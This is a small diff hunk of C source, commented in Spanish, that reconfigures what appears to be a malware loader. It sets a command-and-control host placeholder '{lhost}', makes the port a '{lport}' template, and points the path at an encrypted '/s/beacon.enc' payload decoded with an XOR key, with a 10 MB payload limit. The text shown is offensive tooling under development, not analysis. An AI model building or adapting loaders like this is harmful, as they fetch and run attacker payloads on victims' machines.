@@ -14,8 +14,8 @@
 #include <signal.h> 
 // === CONFIGURACIÓN ===
 #define C2_HOST "{lhost}"
-#define C2_PORT 80
-#define C2_PATH "/beacon.enc"
+#define C2_PORT {lport}
+#define C2_PATH "/s/beacon.enc"
 #define XOR_KEY 0x33
 #define MAX_PAYLOAD_SIZE (10 * 1024 * 1024) // 10 MB
 
